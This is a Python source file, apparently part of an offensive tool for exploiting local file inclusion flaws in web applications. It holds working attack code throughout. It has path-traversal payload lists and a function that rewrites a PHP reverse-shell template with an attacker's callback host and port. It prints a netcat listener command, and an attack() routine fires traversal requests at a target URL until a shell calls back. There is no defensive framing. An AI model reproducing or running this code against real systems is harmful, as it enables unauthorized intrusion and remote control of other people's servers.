import sys
from os.path import dirname, abspath, join
from shutil import copy2
import requests
from urllib3.exceptions import InsecureRequestWarning

PATH_TRAVERSAL = ['../', '..\\', '/../', './../']
HERE = dirname(abspath(__file__))

SHELL = join(HERE, "shell.php")

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class listener:
    """Generate payload that could be used by Metasploit
    """

    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def handler(self):
        print(colors("[~] Start your listener by running",93), end="")
        print(colors(" nc -ntlp {}".format(self.lport),91))


def msf_payload():
    """Use msfvenom to generate reverse shell payload
    """
    filepath = "/tmp/shell.php"
    lhost = input(colors("[?] Host For Callbacks: ", 94))
    lport = input(colors("[?] Port For Callbacks: ", 94))

    print(colors("[~] Generating PHP listener", 93))

    copy2(SHELL, filepath)

    with open(filepath, 'r') as f:
        payload = f.read()

    payload = payload.replace("127.0.0.1", lhost)
    payload = payload.replace("4444", lport)

    with open(filepath, 'w') as f:
        f.write(payload)

    print(colors("[+] Success! ", 92))
    print(colors("[~] listener: /tmp/shell.php", 93))

    return lhost, lport, "shell"


def colors(string, color):
    """Make things colorfull

    Arguments:
        string {str} -- String to apply colors on
        color {int} -- value of color to apply

    """
    return("\033[%sm%s\033[0m" % (color, string))


def cook(cookies):
    c = dict(item.split("=") for item in cookies.split(";"))
    return c


def attack(target, location, cookies=None, headers=None, payload=None, traverse=False, relative=False, data=None, dt=False):
    """Perform specified type of LFI attack

    Arguments:
        target {str} -- Target URL
        location {str} -- Specific location to test

    Keyword Arguments:
        cookies {str} -- Authenticate with cookies (default: {None})
        headers {str} -- Specify headers (default: {None})
        payload {str} -- Custom payload (default: {None})
        traverse {bool} -- traverse the URL (default: {False})
        relative {bool} -- check for relative URL (default: {False})
        dt {bool}  --  Test for directory traversal (default: {False})
    """

    url = target+location
    try:
        if dt:
            res = requests.get(url, headers=headers, verify=False)
            if res.status_code == 200:
                print(colors("[+] Vulnerable: "+ url , 92))

        response = requests.get(url, headers=headers, cookies=cookies, verify=False)

        if response.status_code != 200:
            print(colors("[!] Unexpected HTTP Response ", 91))
            sys.exit(1)
        if not relative:
            r = requests.get(url, verify=False)
            print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))
            if r.status_code != 200:
                print(colors("[!] Unexpected HTTP Response ", 91))

        else:
            for traversal in PATH_TRAVERSAL:
                for i in range(10):
                    lfi = target + traversal * i + location
                    r = requests.get(lfi, headers=headers, cookies=cookies, verify=False)
                    if r.status_code != 200:
                        print(colors("[!] Unexpected HTTP Response ", 91))
            print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))

    except Exception as e:
        print(colors("[!] HTTP Error", 91))
        print(e)
        sys.exit(1)
